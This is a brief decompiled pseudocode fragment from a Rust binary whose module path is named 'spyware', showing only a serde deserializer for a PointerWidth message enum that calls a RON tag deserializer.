__int64 __fastcall spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::PointerWidth>::deserialize(
        __int64 a1,
        __int64 a2)
{
  <&mut ron::de::tag::TagDeserializer as serde::de::Deserializer>::deserialize_enum(
    a1,
    a2,
    aPointerwidth,
    12LL,
    &off_B9000,
    2LL);
  return a1;
}